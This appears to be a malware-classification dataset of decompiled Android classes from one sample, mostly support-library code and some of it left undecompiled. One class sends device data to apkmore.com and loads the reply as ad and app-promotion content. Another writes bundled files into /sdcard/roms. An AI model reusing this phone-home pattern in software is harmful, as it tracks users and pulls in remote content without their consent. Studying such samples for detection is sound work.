"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\o.code","public class o {   Activity f14a;   AbsoluteLayout b;   AbsoluteLayout c;   private Vector d;   private Vector e;   private Vector f;   public o(  Activity activity,  AbsoluteLayout absoluteLayout,  AbsoluteLayout absoluteLayout2){     this.f14a=activity;     this.b=absoluteLayout;     this.c=absoluteLayout2;     a();   }   private void a(){     String str;     FileInputStream openFileInput;     String str2;     try {       StringBuffer stringBuffer=new StringBuffer();       stringBuffer.append(""http://www.apkmore.com/apk/apk.jsp?"");       stringBuffer.append(e.a(this.f14a));       String str3="""";       byte[] a2=e.a(stringBuffer.toString());       if (a2 != null && a2.length > 9) {         try {           FileOutputStream openFileOutput=this.f14a.openFileOutput(""backup.db"",3);           openFileOutput.write(a2);           openFileOutput.close();         }  catch (        Exception e) {           e.printStackTrace();         }       }       try {         openFileInput=this.f14a.openFileInput(""backup.db"");         str2=new String(s.a(e.a(openFileInput)));       }  catch (      Exception e2) {         e=e2;       }       try {         openFileInput.close();         str=str2;       }  catch (      Exception e3) {         e=e3;         str3=str2;         e.printStackTrace();         str=str3;         this.e=new Vector();         this.f=new Vector();         this.d=new Vector();         a(d.d(str));         this.f14a.runOnUiThread(new m(this));       }       this.e=new Vector();       this.f=new Vector();       this.d=new Vector();       a(d.d(str));       this.f14a.runOnUiThread(new m(this));     }  catch (    Exception e4) {       e4.printStackTrace();     }   }   private void a(  d dVar){     if (!dVar.d().equals(r.w)) {       d[] b=d.b(dVar.c());       if (b != null) {         for (        d dVar2 : b) {           a(dVar2);         }         return;       }       return;     }     h hVar=new h(this.f14a);     hVar.a(dVar);     if (hVar.g != null) {       String a2=dVar.a(r.y);       if (a2.equals(r.I)) {         this.e.addElement(hVar);       }  else       if (a2.equals(r.J)) {         this.f.addElement(hVar);       }  else       if (a2.equals(r.K)) {         this.d.addElement(hVar);       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\p.code","public class p implements SensorEventListener {   private static final float[] f15a={30.0f,20.0f,15.0f,10.0f,8.0f,6.0f,5.0f,3.0f,2.0f,1.0f};   private Context b;   private q c;   private int d;   private float e=f15a[7];   public p(  Context context){     this.b=context;   }   public final int a(){     return this.d;   }   public final void a(  int i){     int i2=9;     if (i < 0) {       i2=0;     }  else     if (i <= 9) {       i2=i;     }     this.e=f15a[i2];   }   public final void a(  q qVar){     if (this.c == qVar) {       return;     }     SensorManager sensorManager=(SensorManager)this.b.getSystemService(""sensor"");     if (this.c != null) {       sensorManager.unregisterListener(this);     }     this.c=qVar;     if (this.c != null) {       sensorManager.registerListener(this,sensorManager.getDefaultSensor(3),1);     }   }   @Override public void onAccuracyChanged(  Sensor sensor,  int i){   }   @Override public void onSensorChanged(  SensorEvent sensorEvent){     float f=this.b.getResources().getConfiguration().orientation == 2 ? -sensorEvent.values[1] : -sensorEvent.values[2];     int i=f < (-this.e) ? 0 | 64 : f > this.e ? 0 | 128 : 0;     if (i != this.d) {       this.d=i;       if (this.c != null) {         this.c.onGameKeyChanged();       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\q.code","public interface q {   void onGameKeyChanged(); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\r.code","public class r {   public static final String f16a=""Apps Select"";   public static final String b=""btn"";   static String c=""conf"";   static String d=""item"";   static String e=""width"";   static String f=""height"";   static String g=""screen"";   static String h=""ui"";   static String i=""key"";   static String j=""pad"";   static String k=""keybar"";   static String l=""value"";   static String m=""x"";   static String n=""y"";   static String o=""position"";   static String p=""id"";   static String q=""scale_x"";   static String r=""scale_y"";   static String s=""img"";   static String t=""bg"";   static String u=""keypress"";   static String v=""keyrelease"";   public static String w=""app"";   public static String x=""name"";   public static String y=""type"";   static String z=""web"";   static String A=""admob"";   static String B=""wooboo"";   static String C=""afma"";   static String D=""casee"";   static String E=""youmi"";   static String F=""ming"";   static String G=""zestadz"";   static String H=""inmobi"";   public static String I=""float"";   public static String J=""pop"";   public static String K=""back"";   static String L=""exit"";   static String M=""bookmark"";   static String N=""sms"";   static String O=""left"";   static String P=""right"";   static String Q=""up"";   static String R=""down"";   static String S=""fire"";   static String T=""key_0"";   static String U=""key_1"";   static String V=""key_2"";   static String W=""key_3"";   static String X=""key_4"";   static String Y=""key_5"";   static String Z=""key_6"";   static String aa=""key_7"";   static String ab=""key_8"";   static String ac=""key_9"";   static String ad=""key_star"";   static String ae=""key_pound"";   static String af=""soft_left"";   static String ag=""soft_right"";   static String ah=""market"";   static String ai=""landscape"";   static String aj=""portrait"";   public static String ak=""MIDlet-1"";   public static String al=""MIDlet-Name"";   public static String am=""screen_conf"";   public static String an=""screen_change"";   public static String ao=""screen_xml""; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\s.code","public class s {   private static final int f17a=2;   private static final int b=4;   private static final int c=8;   private static final int d=16;   private static final int e=0;   private static final int f=2;   private static final int g=16;   private static final int h=287;   private static final int k=256;   private static int q;   private static int r;   private static int s;   private static final int[] l={0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0,99,99};   private static final int i=31;   private static final int[] m={3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,i,35,43,51,59,67,83,99,115,131,163,195,227,258};   private static final int[] n={0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13};   private static final int[] o={1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,FragmentTransaction.TRANSIT_FRAGMENT_OPEN,6145,8193,12289,16385,24577};   private static final int j=18;   private static final int[] p={16,17,j,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15};   private static int a(  byte[] bArr,  int i2){     int i3;     if (s == 0) {       int i4=q;       q=i4 + 1;       i3=bArr[i4] & MotionEventCompat.ACTION_MASK;       r=i3;     }  else {       i3=r >> s;     }     int i5=i3;     for (int i6=8 - s; i6 < i2; i6+=8) {       int i7=q;       q=i7 + 1;       r=bArr[i7] & 255;       i5|=r << i6;     }     s=(s + i2) & 7;     return ((1 << i2) - 1) & i5;   }   private static int a(  byte[] bArr,  int[] iArr){     int i2=iArr[0];     while (i2 >= 0) {       if (s == 0) {         int i3=q;         q=i3 + 1;         r=bArr[i3] & 255;       }       i2=(r & (1 << s)) == 0 ? iArr[i2 >> 16] : iArr[i2 & SupportMenu.USER_MASK];       s=(s + 1) & 7;     }     return i2 & SupportMenu.USER_MASK;   }   public static byte[] a(  byte[] r14){     throw new UnsupportedOperationException(""Method not decompiled: a.s.a(byte[]):byte[]"");   }   private static byte[] a(  byte[] bArr,  int[] iArr,  int i2){     int a2;     int i3;     int i4;     byte[] bArr2=new byte[i2];     int i5=0;     int i6=0;     while (i6 < i2) {       int a3=a(bArr,iArr);       if (a3 >= 16) {         if (a3 == 16) {           i3=i6;           i4=i5;           a2=a(bArr,2) + 3;         }  else {           a2=a3 == 17 ? a(bArr,3) + 3 : a(bArr,7) + 11;           i3=i6;           i4=0;         }         while (true) {           int i7=a2 - 1;           if (a2 <= 0) {             break;           }           bArr2[i3]=(byte)i4;           i3++;           a2=i7;         }         i5=i4;         i6=i3;       }  else {         bArr2[i6]=(byte)a3;         i6++;         i5=a3;       }     }     return bArr2;   }   private static int[] b(  byte[] bArr,  int i2){     int[] iArr=new int[17];     for (    byte b2 : bArr) {       iArr[b2]=iArr[b2] + 1;     }     iArr[0]=0;     int[] iArr2=new int[17];     int i3=0;     for (int i4=1; i4 <= 16; i4++) {       i3=(i3 + iArr[i4 - 1]) << 1;       iArr2[i4]=i3;     }     int[] iArr3=new int[(i2 << 1) + 16];     int i5=1;     for (int i6=0; i6 <= i2; i6++) {       byte b3=bArr[i6];       if (b3 != 0) {         int i7=iArr2[b3];         iArr2[b3]=i7 + 1;         int i8=i5;         int i9=0;         for (int i10=b3 - 1; i10 >= 0; i10--) {           if (((1 << i10) & i7) == 0) {             int i11=iArr3[i9] >> 16;             if (i11 == 0) {               iArr3[i9]=iArr3[i9] | (i8 << 16);               int i12=i8;               i8++;               i9=i12;             }  else {               i9=i11;             }           }  else {             int i13=iArr3[i9] & SupportMenu.USER_MASK;             if (i13 == 0) {               iArr3[i9]=iArr3[i9] | i8;               int i14=i8;               i8++;               i9=i14;             }  else {               i9=i13;             }           }         }         iArr3[i9]=Integer.MIN_VALUE | i6;         i5=i8;       }     }     return iArr3;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\t.code","public class t extends Handler {   boolean f18a;   boolean b;   final h c;   private Runnable d;   private long e;   public t(  h hVar,  Runnable runnable,  long j){     this.c=hVar;     this.d=runnable;     this.e=j;   }   public void a(){     if (this.b) {       return;     }     removeMessages(0);     this.f18a=false;     this.b=true;   }   public void a(  long j){     this.e=j;   }   public void b(){     if (this.b) {       this.b=false;       e();     }   }   public void c(){     removeMessages(0);     this.f18a=false;   }   public void d(){     removeMessages(0);     if (this.f18a) {       sendMessageDelayed(obtainMessage(0),this.e);     }   }   public void e(){     if (this.e > 0) {       this.f18a=true;       d();     }   }   @Override public void handleMessage(  Message message){     this.d.run();     if (this.f18a) {       d();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\u.code","public class u {   public static Vector f;   public String f19a;   public String b;   public String c;   public Bitmap d;   public Vector e=new Vector();   public static String a(  Activity activity){     byte[] a2;     f=new Vector();     try {       a(d.d(new String(s.a(e.a(activity.getAssets().open(""game.xml""))))));     }  catch (    Exception e) {       e.printStackTrace();     }     if (f.size() == 0) {       return null;     }     try {       new File(""/sdcard/roms/"").mkdirs();       File file=new File(String.valueOf(""/sdcard/roms/"") + ((u)f.elementAt(0)).c);       if (!file.exists()) {         FileOutputStream fileOutputStream=new FileOutputStream(file);         int size=((u)f.elementAt(0)).e.size();         for (int i=0; i < size; i++) {           InputStream open=activity.getAssets().open((String)((u)f.elementAt(0)).e.elementAt(i));           int available=open.available();           if (available > 0) {             a2=new byte[available];             open.read(a2,0,a2.length);           }  else {             a2=e.a(open);             int length=a2.length;           }           fileOutputStream.write(a2);           open.close();         }         fileOutputStream.close();       }     }  catch (    Exception e2) {       e2.printStackTrace();     }     return ""/sdcard/roms/"" + ((u)f.elementAt(0)).c;   }   private static void a(  d dVar){     if (!dVar.d().equals(""item"")) {       d[] b=d.b(dVar.c());       if (b != null) {         for (        d dVar2 : b) {           a(dVar2);         }         return;       }       return;     }     u uVar=new u();     uVar.f19a=dVar.a(""name"");     uVar.b=dVar.a(""img"");     uVar.c=dVar.a(""rom"");     d[] b2=d.b(dVar.c());     if (b2 != null) {       for (      d dVar3 : b2) {         if (dVar3.d().equals(""part"")) {           uVar.e.addElement(dVar3.a(""data""));         }       }     }     f.addElement(uVar);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\v.code","class v {   private int f20a;   private boolean b;   private boolean c;   private Bitmap d;   private RectF e=new RectF();   public v(  int i){     this.f20a=i;   }   public final float a(){     return this.e.left;   }   public final void a(  Resources resources,  float f,  float f2){     this.d=((BitmapDrawable)resources.getDrawable(this.f20a)).getBitmap();     this.d=Bitmap.createScaledBitmap(this.d,(int)(this.d.getWidth() * f),(int)(this.d.getHeight() * f2),true);   }   public final void a(  Canvas canvas,  Paint paint){     if (this.b || this.c) {       return;     }     canvas.drawBitmap(this.d,this.e.left,this.e.top,paint);   }   public final void a(  boolean z){     this.b=z;   }   public final boolean a(  float f,  float f2){     return this.e.contains(f,f2);   }   public final float b(){     return this.e.top;   }   public final void b(  float f,  float f2){     this.e.set(f,f2,this.d.getWidth() + f,this.d.getHeight() + f2);   }   public final int c(){     return this.d.getWidth();   }   public final int d(){     return this.d.getHeight();   }   public final boolean e(){     return !this.c;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\w.code","!org.eclipse.jdt.core.dom.TypeDeclaration@33430fc"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\x.code","public class x implements View.OnClickListener {   final h f22a;   public x(  h hVar){     this.f22a=hVar;   }   @Override public void onClick(  View view){     if (this.f22a.i != null) {       this.f22a.i.setVisibility(8);     }     this.f22a.g.setVisibility(8);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\y.code","public class y implements View.OnClickListener {   final h f23a;   public y(  h hVar){     this.f23a=hVar;   }   @Override public void onClick(  View view){     Activity activity;     Hashtable hashtable;     Hashtable hashtable2;     Hashtable hashtable3;     if (!this.f23a.e.equals(r.J)) {       activity=this.f23a.j;       hashtable=this.f23a.l;       e.a(activity,(String)hashtable.get(""URL""));     }  else {       h hVar=this.f23a;       hashtable2=this.f23a.l;       String str=(String)hashtable2.get(""TEXT"");       hashtable3=this.f23a.l;       hVar.a(str,(String)hashtable3.get(""URL""));     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\z.code","public class z implements Runnable {   final h f24a;   public z(  h hVar){     this.f24a=hVar;   }   @Override public void run(){     WebView webView;     Hashtable hashtable;     webView=this.f24a.k;     hashtable=this.f24a.l;     webView.loadUrl((String)hashtable.get(""URL""));   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1fca53a7"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompatIcs.code","class AccessibilityServiceInfoCompatIcs {   AccessibilityServiceInfoCompatIcs(){   }   public static boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return info.getCanRetrieveWindowContent();   }   public static String getDescription(  AccessibilityServiceInfo info){     return info.getDescription();   }   public static String getId(  AccessibilityServiceInfo info){     return info.getId();   }   public static ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return info.getResolveInfo();   }   public static String getSettingsActivityName(  AccessibilityServiceInfo info){     return info.getSettingsActivityName();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompatJellyBeanMr2.code","class AccessibilityServiceInfoCompatJellyBeanMr2 {   AccessibilityServiceInfoCompatJellyBeanMr2(){   }   public static int getCapabilities(  AccessibilityServiceInfo info){     return info.getCapabilities();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.accessibilityservice\AccessibilityServiceInfoIcsImpl.code","static class AccessibilityServiceInfoIcsImpl extends AccessibilityServiceInfoStubImpl {   AccessibilityServiceInfoIcsImpl(){   }   @Override public boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getCanRetrieveWindowContent(info);   }   @Override public String getDescription(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getDescription(info);   }   @Override public String getId(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getId(info);   }   @Override public ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getResolveInfo(info);   }   @Override public String getSettingsActivityName(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getSettingsActivityName(info);   }   @Override public int getCapabilities(  AccessibilityServiceInfo info){     return getCanRetrieveWindowContent(info) ? 1 : 0;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.accessibilityservice\AccessibilityServiceInfoJellyBeanMr2.code","static class AccessibilityServiceInfoJellyBeanMr2 extends AccessibilityServiceInfoIcsImpl {   AccessibilityServiceInfoJellyBeanMr2(){   }   @Override public int getCapabilities(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatJellyBeanMr2.getCapabilities(info);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.accessibilityservice\AccessibilityServiceInfoStubImpl.code","static class AccessibilityServiceInfoStubImpl implements AccessibilityServiceInfoVersionImpl {   AccessibilityServiceInfoStubImpl(){   }   @Override public boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return false;   }   @Override public String getDescription(  AccessibilityServiceInfo info){     return null;   }   @Override public String getId(  AccessibilityServiceInfo info){     return null;   }   @Override public ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return null;   }   @Override public String getSettingsActivityName(  AccessibilityServiceInfo info){     return null;   }   @Override public int getCapabilities(  AccessibilityServiceInfo info){     return 0;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.accessibilityservice\AccessibilityServiceInfoVersionImpl.code","interface AccessibilityServiceInfoVersionImpl {   boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo accessibilityServiceInfo);   int getCapabilities(  AccessibilityServiceInfo accessibilityServiceInfo);   String getDescription(  AccessibilityServiceInfo accessibilityServiceInfo);   String getId(  AccessibilityServiceInfo accessibilityServiceInfo);   ResolveInfo getResolveInfo(  AccessibilityServiceInfo accessibilityServiceInfo);   String getSettingsActivityName(  AccessibilityServiceInfo accessibilityServiceInfo); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\Action.code","public static class Action {   public PendingIntent actionIntent;   public int icon;   public CharSequence title;   public Action(  int icon_,  CharSequence title_,  PendingIntent intent_){     this.icon=icon_;     this.title=title_;     this.actionIntent=intent_;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ActionBarDrawerToggle.code","public class ActionBarDrawerToggle implements DrawerLayout.DrawerListener {   private static final int ID_HOME=16908332;   private static final ActionBarDrawerToggleImpl IMPL;   private static final float TOGGLE_DRAWABLE_OFFSET=0.33333334f;   private final Activity mActivity;   private final Delegate mActivityImpl;   private final int mCloseDrawerContentDescRes;   private Drawable mDrawerImage;   private final int mDrawerImageResource;   private boolean mDrawerIndicatorEnabled=true;   private final DrawerLayout mDrawerLayout;   private final int mOpenDrawerContentDescRes;   private Object mSetIndicatorInfo;   private SlideDrawable mSlider;   private Drawable mThemeImage; public interface ActionBarDrawerToggleImpl {     Drawable getThemeUpIndicator(    Activity activity);     Object setActionBarDescription(    Object obj,    Activity activity,    int i);     Object setActionBarUpIndicator(    Object obj,    Activity activity,    Drawable drawable,    int i);   } public interface Delegate {     Drawable getThemeUpIndicator();     void setActionBarDescription(    int i);     void setActionBarUpIndicator(    Drawable drawable,    int i);   } public interface DelegateProvider {     Delegate getDrawerToggleDelegate();   } private static class ActionBarDrawerToggleImplBase implements ActionBarDrawerToggleImpl {     private ActionBarDrawerToggleImplBase(){     }     @Override public Drawable getThemeUpIndicator(    Activity activity){       return null;     }     @Override public Object setActionBarUpIndicator(    Object info,    Activity activity,    Drawable themeImage,    int contentDescRes){       return info;     }     @Override public Object setActionBarDescription(    Object info,    Activity activity,    int contentDescRes){       return info;     }   } private static class ActionBarDrawerToggleImplHC implements ActionBarDrawerToggleImpl {     private ActionBarDrawerToggleImplHC(){     }     @Override public Drawable getThemeUpIndicator(    Activity activity){       return ActionBarDrawerToggleHoneycomb.getThemeUpIndicator(activity);     }     @Override public Object setActionBarUpIndicator(    Object info,    Activity activity,    Drawable themeImage,    int contentDescRes){       return ActionBarDrawerToggleHoneycomb.setActionBarUpIndicator(info,activity,themeImage,contentDescRes);     }     @Override public Object setActionBarDescription(    Object info,    Activity activity,    int contentDescRes){       return ActionBarDrawerToggleHoneycomb.setActionBarDescription(info,activity,contentDescRes);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 11) {       IMPL=new ActionBarDrawerToggleImplHC();     }  else {       IMPL=new ActionBarDrawerToggleImplBase();     }   }   public ActionBarDrawerToggle(  Activity activity,  DrawerLayout drawerLayout,  int drawerImageRes,  int openDrawerContentDescRes,  int closeDrawerContentDescRes){     this.mActivity=activity;     if (activity instanceof DelegateProvider) {       this.mActivityImpl=((DelegateProvider)activity).getDrawerToggleDelegate();     }  else {       this.mActivityImpl=null;     }     this.mDrawerLayout=drawerLayout;     this.mDrawerImageResource=drawerImageRes;     this.mOpenDrawerContentDescRes=openDrawerContentDescRes;     this.mCloseDrawerContentDescRes=closeDrawerContentDescRes;     this.mThemeImage=getThemeUpIndicator();     this.mDrawerImage=activity.getResources().getDrawable(drawerImageRes);     this.mSlider=new SlideDrawable(this.mDrawerImage);     this.mSlider.setOffset(TOGGLE_DRAWABLE_OFFSET);   }   public void syncState(){     if (this.mDrawerLayout.isDrawerOpen(GravityCompat.START)) {       this.mSlider.setPosition(1.0f);     }  else {       this.mSlider.setPosition(0.0f);     }     if (this.mDrawerIndicatorEnabled) {       setActionBarUpIndicator(this.mSlider,this.mDrawerLayout.isDrawerOpen(GravityCompat.START) ? this.mCloseDrawerContentDescRes : this.mOpenDrawerContentDescRes);     }   }   public void setDrawerIndicatorEnabled(  boolean enable){     if (enable != this.mDrawerIndicatorEnabled) {       if (enable) {         setActionBarUpIndicator(this.mSlider,this.mDrawerLayout.isDrawerOpen(GravityCompat.START) ? this.mCloseDrawerContentDescRes : this.mOpenDrawerContentDescRes);       }  else {         setActionBarUpIndicator(this.mThemeImage,0);       }       this.mDrawerIndicatorEnabled=enable;     }   }   public boolean isDrawerIndicatorEnabled(){     return this.mDrawerIndicatorEnabled;   }   public void onConfigurationChanged(  Configuration newConfig){     this.mThemeImage=getThemeUpIndicator();     this.mDrawerImage=this.mActivity.getResources().getDrawable(this.mDrawerImageResource);     syncState();   }   public boolean onOptionsItemSelected(  MenuItem item){     if (item != null && item.getItemId() == 16908332 && this.mDrawerIndicatorEnabled) {       if (this.mDrawerLayout.isDrawerVisible(GravityCompat.START)) {         this.mDrawerLayout.closeDrawer(GravityCompat.START);       }  else {         this.mDrawerLayout.openDrawer(GravityCompat.START);       }       return true;     }     return false;   }   @Override public void onDrawerSlide(  View drawerView,  float slideOffset){     float glyphOffset;     float glyphOffset2=this.mSlider.getPosition();     if (slideOffset > 0.5f) {       glyphOffset=Math.max(glyphOffset2,Math.max(0.0f,slideOffset - 0.5f) * 2.0f);     }  else {       glyphOffset=Math.min(glyphOffset2,slideOffset * 2.0f);     }     this.mSlider.setPosition(glyphOffset);   }   @Override public void onDrawerOpened(  View drawerView){     this.mSlider.setPosition(1.0f);     if (this.mDrawerIndicatorEnabled) {       setActionBarDescription(this.mCloseDrawerContentDescRes);     }   }   @Override public void onDrawerClosed(  View drawerView){     this.mSlider.setPosition(0.0f);     if (this.mDrawerIndicatorEnabled) {       setActionBarDescription(this.mOpenDrawerContentDescRes);     }   }   @Override public void onDrawerStateChanged(  int newState){   }   Drawable getThemeUpIndicator(){     return this.mActivityImpl != null ? this.mActivityImpl.getThemeUpIndicator() : IMPL.getThemeUpIndicator(this.mActivity);   }   void setActionBarUpIndicator(  Drawable upDrawable,  int contentDescRes){     if (this.mActivityImpl != null) {       this.mActivityImpl.setActionBarUpIndicator(upDrawable,contentDescRes);     }  else {       this.mSetIndicatorInfo=IMPL.setActionBarUpIndicator(this.mSetIndicatorInfo,this.mActivity,upDrawable,contentDescRes);     }   }   void setActionBarDescription(  int contentDescRes){     if (this.mActivityImpl != null) {       this.mActivityImpl.setActionBarDescription(contentDescRes);     }  else {       this.mSetIndicatorInfo=IMPL.setActionBarDescription(this.mSetIndicatorInfo,this.mActivity,contentDescRes);     }   } public class SlideDrawable extends LevelListDrawable implements Drawable.Callback {     private final boolean mHasMirroring;     private float mOffset;     private float mPosition;     private final Rect mTmpRect;     private SlideDrawable(    Drawable wrapped){       this.mHasMirroring=Build.VERSION.SDK_INT > 18;       this.mTmpRect=new Rect();       if (DrawableCompat.isAutoMirrored(wrapped)) {         DrawableCompat.setAutoMirrored(this,true);       }       addLevel(0,0,wrapped);     }     public void setPosition(    float position){       this.mPosition=position;       invalidateSelf();     }     public float getPosition(){       return this.mPosition;     }     public void setOffset(    float offset){       this.mOffset=offset;       invalidateSelf();     }     @Override public void draw(    Canvas canvas){       copyBounds(this.mTmpRect);       canvas.save();       boolean isLayoutRTL=ViewCompat.getLayoutDirection(ActionBarDrawerToggle.this.mActivity.getWindow().getDecorView()) == 1;       int flipRtl=isLayoutRTL ? -1 : 1;       int width=this.mTmpRect.width();       canvas.translate((-this.mOffset) * width * this.mPosition* flipRtl,0.0f);       if (isLayoutRTL && !this.mHasMirroring) {         canvas.translate(width,0.0f);         canvas.scale(-1.0f,1.0f);       }       super.draw(canvas);       canvas.restore();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ActionBarDrawerToggleHoneycomb.code","class ActionBarDrawerToggleHoneycomb {   private static final String TAG=""ActionBarDrawerToggleHoneycomb"";   private static final int[] THEME_ATTRS={R.attr.homeAsUpIndicator};   ActionBarDrawerToggleHoneycomb(){   }   public static Object setActionBarUpIndicator(  Object info,  Activity activity,  Drawable drawable,  int contentDescRes){     if (info == null) {       info=new SetIndicatorInfo(activity);     }     SetIndicatorInfo sii=(SetIndicatorInfo)info;     if (sii.setHomeAsUpIndicator != null) {       try {         ActionBar actionBar=activity.getActionBar();         sii.setHomeAsUpIndicator.invoke(actionBar,drawable);         sii.setHomeActionContentDescription.invoke(actionBar,Integer.valueOf(contentDescRes));       }  catch (      Exception e) {         Log.w(TAG,""Couldn't set home-as-up indicator via JB-MR2 API"",e);       }     }  else     if (sii.upIndicatorView != null) {       sii.upIndicatorView.setImageDrawable(drawable);     }  else {       Log.w(TAG,""Couldn't set home-as-up indicator"");     }     return info;   }   public static Object setActionBarDescription(  Object info,  Activity activity,  int contentDescRes){     if (info == null) {       info=new SetIndicatorInfo(activity);     }     SetIndicatorInfo sii=(SetIndicatorInfo)info;     if (sii.setHomeAsUpIndicator != null) {       try {         ActionBar actionBar=activity.getActionBar();         sii.setHomeActionContentDescription.invoke(actionBar,Integer.valueOf(contentDescRes));       }  catch (      Exception e) {         Log.w(TAG,""Couldn't set content description via JB-MR2 API"",e);       }     }     return info;   }   public static Drawable getThemeUpIndicator(  Activity activity){     TypedArray a2=activity.obtainStyledAttributes(THEME_ATTRS);     Drawable result=a2.getDrawable(0);     a2.recycle();     return result;   } private static class SetIndicatorInfo {     public Method setHomeActionContentDescription;     public Method setHomeAsUpIndicator;     public ImageView upIndicatorView;     SetIndicatorInfo(    Activity activity){       try {         this.setHomeAsUpIndicator=ActionBar.class.getDeclaredMethod(""setHomeAsUpIndicator"",Drawable.class);         this.setHomeActionContentDescription=ActionBar.class.getDeclaredMethod(""setHomeActionContentDescription"",Integer.TYPE);       }  catch (      NoSuchMethodException e) {         View home=activity.findViewById(R.id.home);         if (home != null) {           ViewGroup parent=(ViewGroup)home.getParent();           int childCount=parent.getChildCount();           if (childCount == 2) {             View first=parent.getChildAt(0);             View second=parent.getChildAt(1);             View up=first.getId() == 16908332 ? second : first;             if (up instanceof ImageView) {               this.upIndicatorView=(ImageView)up;             }           }         }       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ActionBarDrawerToggleImpl.code","public interface ActionBarDrawerToggleImpl {   Drawable getThemeUpIndicator(  Activity activity);   Object setActionBarDescription(  Object obj,  Activity activity,  int i);   Object setActionBarUpIndicator(  Object obj,  Activity activity,  Drawable drawable,  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ActionBarDrawerToggleImplBase.code","private static class ActionBarDrawerToggleImplBase implements ActionBarDrawerToggleImpl {   private ActionBarDrawerToggleImplBase(){   }   @Override public Drawable getThemeUpIndicator(  Activity activity){     return null;   }   @Override public Object setActionBarUpIndicator(  Object info,  Activity activity,  Drawable themeImage,  int contentDescRes){     return info;   }   @Override public Object setActionBarDescription(  Object info,  Activity activity,  int contentDescRes){     return info;   } } "
